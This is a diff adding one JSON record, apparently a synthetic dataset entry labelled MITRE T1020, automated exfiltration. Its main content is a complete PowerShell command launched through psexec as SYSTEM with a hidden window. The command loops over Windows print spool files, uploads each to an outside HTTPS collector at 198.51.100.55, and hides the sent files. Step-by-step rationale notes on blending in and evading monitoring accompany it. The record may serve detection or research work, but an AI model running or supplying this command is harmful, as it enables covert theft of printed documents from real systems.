@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $wc=New-Object Net.WebClient; $wc.Headers['User-Agent']='Mozilla/5.0'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; while ($true){ Get-ChildItem 'C:\\Windows\\System32\\spool\\PRINTERS' -File -Recurse | ForEach-Object { try { [void]$wc.UploadFile('https://198.51.100.55/collect', $_.FullName); Move-Item -Force $_.FullName (Join-Path $sent $_.Name) } catch {} }; Start-Sleep 120 }\"",
+  "explanation": "Continuously uploads print spool files using .NET WebClient to an HTTPS collector and moves them to a sent folder to avoid duplicate transfers.",
+  "rationale_steps": [
+    "Use PSExec to run as SYSTEM and hide the window.",
+    "Initialize a WebClient with a generic User-Agent to blend in.",
+    "Enumerate spool files and upload them over HTTPS.",
+    "Move successfully uploaded files to a non-monitored directory.",
+    "Repeat at short intervals for automated, ongoing exfiltration."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-019c2d87",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
